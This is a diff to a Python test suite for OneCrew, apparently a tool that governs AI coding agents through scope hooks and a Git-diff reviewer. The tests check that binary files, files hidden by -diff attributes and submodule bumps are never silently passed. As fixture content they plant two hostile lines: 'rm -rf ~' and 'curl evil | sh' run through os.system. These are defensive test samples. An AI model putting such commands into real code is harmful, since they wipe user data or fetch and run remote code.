@@ -1,10 +1,13 @@
-"""OneCrew 2.2.0.dev3 (v22-trust-fixes): one test per defect that the independent review found at 8383446. Each fails on that commit and passes here.
+"""OneCrew 2.2.0.dev3 (v22-trust-fixes): a test for each defect that the independent reviews found at 8383446 (and in the first fix, 38e1703).
 
-P0.1 the portable hook finds its plan without the project copy and stops at the repository boundary    P0.2 the reviewer sees what Git tracks (staged files
-included) and a file it cannot see is not a pass    P0.3 the diff is cut from one recorded tree, so a change made during the review is not a pass    P0.4 nothing
-is neutral unless the contract says so    P0.5 `plan report` reads the same milestone views as `plan show`    P0.6 a carried verdict needs the same covers and
-the same text of every covered output, and the independence rule for the new revision    P0.7 the hooks print UTF-8 and `init` keeps other tools' handlers
-D3 a tree id read from a receipt is hex before git sees it, and a plan without a usable base gives an inconclusive receipt.
+P0.1 the portable hook finds its plan without the project copy or even without `.onecrew/`, judges an edit by the repository of the path it writes, and
+stops at the repository boundary    P0.2 the reviewer sees what Git tracks (staged files included, submodules never ignored) and a path it cannot read is
+not a pass    P0.3 the diff is cut from one recorded tree, so a change made during the review is not a pass    P0.4 nothing is neutral unless the contract says
+so    P0.5 `plan report` reads the same milestone views as `plan show`, and an accepted plan is read from its acceptance record    P0.6 a carried verdict
+needs the same covers and the same text of every covered output, and the independence rule for the new revision    P0.7 the hooks print UTF-8 and `init` keeps
+other tools' handlers    D3 a tree id read from a receipt is hex before git sees it, and a plan without a usable base gives an inconclusive receipt.
+Every defect has a test that fails on the code that had it. A few tests are guards for behaviour that must not change (an ignored file is no obstacle, an
+explicit project is searched in itself only, an accepted plan's report does not move after a later commit) and are green on the old code too.
 No test calls a model: reviewer.call is replaced.
 """
 import argparse
@@ -12,6 +15,7 @@ import contextlib
 import io
 import json
 import os
+import shutil
 import subprocess
 import sys
 import tempfile
@@ -68,8 +72,9 @@ class HookBase(unittest.TestCase):
         with patch.dict(os.environ, {'CLAUDE_PROJECT_DIR': str(project)}):
             return hook_cli.governing(args, {'cwd': str(cwd or project)})
 
-    def check(self, tool, target, project=None):
-        event = json.dumps({'tool_name': tool, 'tool_input': {'file_path': str(target)}, 'cwd': str(project or self.repo), 'session_id': 's'})
+    def check(self, tool, target=None, project=None, cwd=None, command=None):
+        tool_input = {'command': command} if command is not None else {'file_path': str(target)}
+        event = json.dumps({'tool_name': tool, 'tool_input': tool_input, 'cwd': str(cwd or project or self.repo), 'session_id': 's'})
         stdin = type('In', (), {'buffer': io.BytesIO(event.encode('utf-8'))})()
         err = io.StringIO()
         with patch.dict(os.environ, {'CLAUDE_PROJECT_DIR': str(project or self.repo)}), patch.object(sys, 'stdin', stdin), contextlib.redirect_stderr(err):
@@ -118,6 +123,55 @@ class HookFindsItsPlan(HookBase):
         sub = self.repo / 'sub'; sub.mkdir()
         args = argparse.Namespace(project=sub, state_root=None)
         self.assertEqual(hook_cli.locate(args, {}), (None, sub, None))
+
+    def test_deleting_the_whole_onecrew_folder_does_not_hide_a_custom_state_root(self):
+        self.config(self.repo); self.project_copy(self.repo); self.state_copy(self.repo)
+        where.register_project(self.repo, self.state)                        # what `onecrew init` does, in a place outside the project
+        shutil.rmtree(self.repo / '.onecrew')                                # config.json goes with the folder
+        self.assertIsNone(where.configured_state_root(self.repo))
+        code, text = self.check('Edit', self.repo / 'outside.txt')
+        self.assertEqual(code, 2, text); self.assertIn('not in the owned scope', text)
+        self.assertEqual(self.check('Edit', self.repo / 'a.txt')[0], 0)
+
+    def test_init_records_the_state_root_outside_the_project_and_the_registry_forgets_what_is_gone(self):
+        exe = self.base / 'venv' / 'onecrew'; exe.parent.mkdir(); exe.write_text('x')
+        with contextlib.redirect_stdout(io.StringIO()):
+            code = install.init(project=self.repo, state_root=self.state, yes=True, exe=exe, claude=lambda: ('ok', 'claude', ''))
+        self.assertEqual(code, 0)
+        self.assertEqual(where.registered_state_root(self.repo).resolve(), self.state.resolve())
+        self.assertFalse(str(where.registry_file()).startswith(str(self.repo)))
+        gone = self.base / 'gone'; gone.mkdir(); where.register_project(gone, self.state); gone.rmdir()
+        where.register_project(self.repo, self.state)
+        self.assertEqual(list(json.loads(where.registry_file().read_text(encoding='utf-8'))['projects']), [os.path.normcase(str(self.repo.resolve()))])
+
+
+class HookJudgesTheRepositoryOfThePath(HookBase):
+    """A session opened in a parent checkout (CLAUDE_PROJECT_DIR) that edits a file of a nested worktree with its own plan: that plan governs the edit."""
+
+    def setUp(self):
+        super().setUp()
+        self.child = self.repo / 'wt' / 'child'; (self.child / '.git').mkdir(parents=True)
+        self.project_copy(self.child)
+
+    def test_an_edit_in_the_worktree_is_judged_by_the_plan_of_the_worktree(self):
+        for cwd in (self.repo, self.child):                      # the session never moved, or it moved into the worktree
+            with self.subTest(cwd=cwd.name):
+                code, text = self.check('Edit', self.child / 'outside.txt', project=self.repo, cwd=cwd)
+                self.assertEqual(code, 2, text); self.assertIn('not in the owned scope', text)
+                self.assertEqual(self.check('Edit', self.child / 'a.txt', project=self.repo, cwd=cwd)[0], 0)
+        self.assertEqual(self.check('Write', self.child / 'new' / 'deep' / 'file.txt', project=self.repo)[0], 2)      # the folders of a new file do not exist yet
+        self.assertEqual(self.check('Edit', self.repo / 'other.txt', project=self.repo)[0], 0)                        # the parent has no plan of its own
+
+    def test_a_shell_command_is_judged_by_the_plan_of_its_cwd(self):
+        code, text = self.check('Bash', project=self.repo, cwd=self.child, command='echo x > outside.txt')
+        self.assertEqual(code, 2, text)
+        self.assertEqual(self.check('Bash', project=self.repo, cwd=self.repo, command='echo x > other.txt')[0], 0)
+
+    def test_the_process_cwd_is_a_place_only_when_nothing_else_names_one(self):
+        os.environ.pop('CLAUDE_PROJECT_DIR', None)
+        args = argparse.Namespace(project=None, state_root=None)
+        self.assertEqual(hook_cli.candidate_dirs(args, {'tool_name': 'Bash', 'tool_input': {'command': 'ls'}}), [os.getcwd()])
+        self.assertEqual(hook_cli.candidate_dirs(args, {'tool_name': 'Bash', 'tool_input': {'command': 'ls'}, 'cwd': str(self.child)}), [str(self.child)])
 
 
 # ---- P0.7: UTF-8 on stdout and stderr, and the handlers of other tools --------------------------------------------------------------------
@@ -256,16 +310,113 @@ class ReviewerSeesWhatGitTracks(ReviewerBase):
         self.assertEqual((receipt['result'], receipt['calls'], receipt['not_shown']), ('inconclusive', 0, ['junk.txt']))
         self.assertEqual(reviewer.expected_result(dict(receipt, error=None)), 'inconclusive')
 
-    def test_a_path_the_diff_does_not_name_is_reported(self):
-        self.start(); self.commit('a.txt', 'one\ntwo\n'); self.commit('data.bin', 'binary-ish\n')
+    def test_a_path_the_diff_does_not_name_is_reported_by_its_whole_header(self):
+        self.start(); self.commit('a.txt', 'one\ntwo\n'); self.commit('data/a.txt', 'nested\n')
         tracked = command.tracked_tree(self.root)
         base = [p for k, p in self.events() if k == 'plan.approved'][0]['base_tracked']
         diff = verdict.diff(self.ledger, 'P1', 'M1')
         self.assertEqual(reviewer.not_shown(self.root, base, tracked, diff), [])
-        self.assertEqual(reviewer.not_shown(self.root, base, tracked, diff.replace('data.bin', 'x')), ['data.bin'])
+        cut = '\n'.join(l for l in diff.split('\n') if l != 'diff --git a/a.txt b/a.txt')        # the header of a.txt is gone; that of data/a.txt (which holds "a.txt") is not
+        self.assertEqual(reviewer.not_shown(self.root, base, tracked, cut), ['a.txt'])
+
+    def test_headers_with_special_characters_are_compared_the_way_git_writes_them(self):
+        names = ['plain.txt', 'with space.txt', 'tab\there.txt', 'quote"d.txt', 'back\\slash.txt', 'bell\a.txt', 'café.txt', 'ctl\x01.txt']
+        header = lambda p: f'diff --git {reviewer._git_name("a/", p)} {reviewer._git_name("b/", p)}'
+        self.assertEqual(header('plain.txt'), 'diff --git a/plain.txt b/plain.txt')
+        self.assertEqual(header('with space.txt'), 'diff --git a/with space.txt b/with space.txt')
+        self.assertEqual(header('tab\there.txt'), 'diff --git "a/tab\\there.txt" "b/tab\\there.txt"')
+        self.assertEqual(header('quote"d.txt'), 'diff --git "a/quote\\"d.txt" "b/quote\\"d.txt"')
+        self.assertEqual(header('back\\slash.txt'), 'diff --git "a/back\\\\slash.txt" "b/back\\\\slash.txt"')
+        self.assertEqual(header('ctl\x01.txt'), 'diff --git "a/ctl\\001.txt" "b/ctl\\001.txt"')
+        self.assertEqual(header('café.txt'), 'diff --git a/café.txt b/café.txt')            # core.quotepath=off: non-ASCII is written as it is
+        with patch.object(command, 'changed_paths', return_value=names):
+            self.assertEqual(reviewer.not_shown(self.root, 'a' * 40, 'b' * 40, '\n'.join(header(p) for p in names)), [])
+            self.assertEqual(reviewer.not_shown(self.root, 'a' * 40, 'b' * 40, '\n'.join(header(p) for p in names[:-1])), [names[-1]])
+
+
+    def test_a_binary_file_is_named_and_the_reviewer_is_not_asked(self):
+        self.start(); self.commit('a.txt', 'one\ntwo\n')
+        (self.root / 'img.bin').write_bytes(b'\x00\x01\x02 not text'); self.git('add', 'img.bin')
+        verdict.run(self.ledger, 'P1', 'M1', self.root)
+        receipt = self.last()
+        self.assertEqual((receipt['result'], receipt['calls'], receipt['not_shown'], self.prompts), ('inconclusive', 0, ['img.bin'], []))
+        self.assertIn('Binary files differ', receipt['error']); self.assertIn('img.bin', receipt['error'])
+        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())
+
+    def test_text_that_a_diff_attribute_keeps_out_of_the_diff_is_not_passed_either(self):
+        self.start()
+        (self.root / '.git' / 'info').mkdir(exist_ok=True); (self.root / '.git' / 'info' / 'attributes').write_text('*.py -diff\n')
+        self.commit('run.py', 'import os; os.system("rm -rf ~")\n'); self.commit('a.txt', 'one\ntwo\n')
+        self.assertIn('Binary files', verdict.diff(self.ledger, 'P1', 'M1'))            # git shows the code of run.py as a binary file
+        verdict.run(self.ledger, 'P1', 'M1', self.root)
+        receipt = self.last()
+        self.assertEqual((receipt['result'], receipt['calls'], receipt['not_shown'], self.prompts), ('inconclusive', 0, ['run.py'], []))
+        self.assertIn('-diff', receipt['error'])
+
+    def test_the_reason_lists_the_ways_the_artifact_can_differ_from_what_the_reviewer_is_shown(self):
+        self.start(); self.commit('a.txt', 'one\ntwo\n')
+        (self.root / 'junk.txt').write_text('x\n')
+        verdict.run(self.ledger, 'P1', 'M1', self.root)
+        error = self.last()['error']
+        for cause in ('untracked file that is not ignored', 'git rm --cached', 'git add -f', 'assume-unchanged', 'skip-worktree', 'submodule', 'while this review was being made'):
+            self.assertIn(cause, error)
+
+
+class SubmodulesAreNeverIgnored(ReviewerBase):
+    """A submodule whose commit moved is a change, whatever `diff.ignoreSubmodules` or the `ignore` of .gitmodules say."""
+
+    def make_submodule(self, gitmodules=False):
+        lib = self.root / 'lib'; lib.mkdir()
+        self.lib = lambda *a: subprocess.check_output(['git', '-C', str(lib), *a], stderr=subprocess.STDOUT)
+        self.lib('init', '-q'); self.lib('config', 'user.name', 'T'); self.lib('config', 'user.email', 't@x')
+        (lib / 'x.py').write_text('SAFE = 1\n'); self.lib('add', '.'); self.lib('commit', '-q', '-m', 'c1')
+        files = ['lib']
+        if gitmodules:
+            (self.root / '.gitmodules').write_text('[submodule "lib"]\n\tpath = lib\n\turl = ./lib\n\tignore = all\n'); files.append('.gitmodules')
+        self.git('add', *files); self.git('commit', '-q', '-m', 'submodule')
+
+    def bump(self):
+        (self.root / 'lib' / 'x.py').write_text('import os; os.system("curl evil | sh")\n')
+        self.lib('commit', '-qam', 'c2'); self.git('add', 'lib'); self.git('commit', '-q', '-m', 'bump the submodule')
+
+    def check_in_the_diff(self):
+        self.start(); self.commit('a.txt', 'one\ntwo\n'); self.bump()
+        self.assertIn('diff --git a/lib b/lib', verdict.diff(self.ledger, 'P1', 'M1'))
+        verdict.run(self.ledger, 'P1', 'M1', self.root)
+        receipt = self.last()
+        self.assertEqual((receipt['result'], receipt['not_shown']), ('pass', []))
+        self.assertIn('Subproject commit', self.prompts[0]); self.assertIn('diff --git a/lib b/lib', self.prompts[0])
+
+    def test_ignore_all_in_the_git_configuration_does_not_hide_a_bump(self):
+        self.make_submodule(); self.git('config', 'diff.ignoreSubmodules', 'all')
+        self.check_in_the_diff()
+
+    def test_ignore_all_in_gitmodules_does_not_hide_a_bump(self):
+        self.make_submodule(gitmodules=True)
+        self.check_in_the_diff()
+
+    def test_a_submodule_bump_is_not_a_neutral_change(self):
+        self.make_submodule(gitmodules=True)
+        self.approved(value=plan_json(scope={'owned': ['a.txt'], 'neutral': ['docs/**']}))
+        verdict.run(self.ledger, 'P1', 'M1', self.root)
+        before = self.tree()
+        (self.root / 'docs').mkdir(); (self.root / 'docs' / 'r.md').write_text('# r\n'); self.git('add', 'docs')
+        self.bump()
+        self.assertEqual(command.changed_paths(self.root, before, self.tree()), ['docs/r.md', 'lib'])
+        view = self.view()
+        self.assertNotEqual(view['state'], 'passed'); self.assertNotIn('neutral_diff', view)
+        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())
 
 
 class ReviewerDiffIsOneTree(ReviewerBase):
+    def test_a_working_tree_whose_artifact_cannot_be_made_gives_an_inconclusive_receipt_not_an_error(self):
+        self.start(); self.commit('a.txt', 'one\ntwo\n')
+        with patch.object(command, 'artifact_sha', side_effect=LedgerError('git is gone')): verdict.run(self.ledger, 'P1', 'M1', self.root)
+        receipt = self.last()
+        self.assertEqual((receipt['result'], receipt['calls'], receipt['artifact_sha'], self.prompts), ('inconclusive', 0, '0' * 40, []))
+        self.assertIn('git is gone', receipt['error'])
+        self.assertNotEqual(self.view()['state'], 'passed')
+
     def test_a_change_made_after_the_diff_was_cut_cannot_pass(self):
         self.start(); self.commit('a.txt', 'one\ntwo\n')
         cut = reviewer.review_diff
@@ -337,12 +488,20 @@ class TreeIdsFromReceipts(ReviewerBase):
         self.assertIn('tree id', receipt['error'])
 
     def test_a_plan_approved_before_the_tracked_base_existed_gives_an_inconclusive_receipt_with_the_reason(self):
+        """An old plan: no base_tracked, no base_artifact, and every commit is later than the approval, so the commit-before-approval guess finds nothing
+        (8383446 raised `No commit before the approval` out of verdict run)."""
+        later = dict(os.environ, GIT_COMMITTER_DATE='2099-01-01T00:00:00', GIT_AUTHOR_DATE='2099-01-01T00:00:00')
+        commit = lambda *a: subprocess.check_call(['git', '-C', str(self.root), 'commit', '-q', *a], env=later)
+        commit('--amend', '--no-edit', '--date=2099-01-01T00:00:00')
         with patch.object(plans, '_base_tracked', return_value=None), patch.object(plans, '_base_artifact', return_value=None): self.start()
-        self.commit('a.txt', 'one\ntwo\n')
+        (self.root / 'a.txt').write_text('one\ntwo\n'); self.git('add', '.'); commit('-m', 'work')
+        self.assertEqual(self.git('rev-list', '--count', '--before=' + [p for k, p in self.events() if k == 'plan.approved'][0]['at'], 'HEAD'), '0')
         verdict.run(self.ledger, 'P1', 'M1', self.root)
         receipt = self.last()
         self.assertEqual((receipt['result'], receipt['calls'], self.prompts), ('inconclusive', 0, []))
         self.assertIn('no tracked-only base tree', receipt['error'])
+        with self.assertRaises(LedgerError) as caught: verdict.diff(self.ledger, 'P1', 'M1')
+        self.assertIn('no tracked-only base tree', str(caught.exception))
 
 
 # ---- P0.4 and P0.6: what a carried verdict may stand for ----------------------------------------------------------------------------------
@@ -441,6 +600,7 @@ class ReportReadsTheSharedView(ReviewerBase):
         self.assertEqual((shown['state'], shown['carried_from']), ('passed', 1))
         text = self.text()
         self.assertIn('O1 ĐẠT', text); self.assertNotIn('M1 chưa có verdict', text)
+        self.assertIn('M1 pass (kế thừa từ bản 1)', text); self.assertIn('M1=pass kế thừa', text)
         self.assertIn('Reviewer ghi chú', text); self.assertIn('OUTSIDE-NOTE-7731', text)
 
     def test_a_pass_the_artifact_has_left_is_stale_in_the_report_too(self):
@@ -451,6 +611,36 @@ class ReportReadsTheSharedView(ReviewerBase):
         self.assertEqual((shown['state'], shown.get('stale')), ('pending', True))
         text = self.text()
         self.assertIn('O1 CHƯA', text); self.assertNotIn('O1 ĐẠT', text)
+        self.assertIn('M1=cũ', text)                                                    # the output line says what plan show says: not a pass any more
+        self.assertIn('M1 cũ (pass trên artifact khác, cần chạy lại)', text)               # the milestone line does not print `M1 pass`
+        self.assertNotIn('M1 pass', text)
+        self.assertIn('Vì sao: mốc M1 cũ: đạt trên artifact khác, cần chạy lại', text)     # and the conclusion does not say "no verdict yet"
+        self.assertNotIn('chưa có verdict', text)
+
+    def test_an_accepted_plan_is_read_from_its_acceptance_record_not_from_todays_rules(self):
+        self.approved(value=plan_json(scope={'owned': ['a.txt'], 'neutral': ['*.md']}))
+        verdict.run(self.ledger, 'P1', 'M1', self.root)
+        self.commit('NOTES.md', 'notes\n')                                              # a commit the contract itself calls neutral: the pass is carried over it
+        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')
+        text, shown = self.text(), self.view()
+        self.assertEqual((shown['state'], shown.get('neutral_diff')), ('passed', True))
+        self.assertIn('Kết luận: XONG', text); self.assertIn('M1 pass (chỉ khác đường dẫn trung lập)', text)
+        with patch.object(contracts, 'neutral_globs', return_value=[]):                 # rules under which that acceptance would not have been possible
+            again = self.view()
+            self.assertEqual((again['state'], again.get('neutral_diff')), ('passed', True))
+            self.assertEqual(self.text(), text)
+
+    def test_an_accepted_carried_verdict_stays_carried_whatever_the_inheritance_rule_says_now(self):
+        self.approved(value=plan_json(milestones=[milestone('M1'), milestone('M2')]))
+        verdict.run(self.ledger, 'P1', 'M1', self.root)
+        plans.amend(self.ledger, 'P1', plan_json(milestones=[milestone('M1'), milestone('M2', title='M2 reworded')]), 'wording', 'codex')
+        plans.approve(self.ledger, 'P1', 'owner', 'ref')
+        verdict.run(self.ledger, 'P1', 'M2', self.root)
+        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')
+        text = self.text()
+        self.assertIn('Kết luận: XONG', text); self.assertIn('M1 pass (kế thừa từ bản 1)', text)
+        with patch.object(plans, '_inherited', return_value=None):
+            self.assertEqual(self.view('M1')['state'], 'passed'); self.assertEqual(self.text(), text)
 
     def test_an_accepted_plan_is_read_at_the_artifact_accepted_so_its_report_does_not_move(self):
         self.approved(); verdict.run(self.ledger, 'P1', 'M1', self.root)
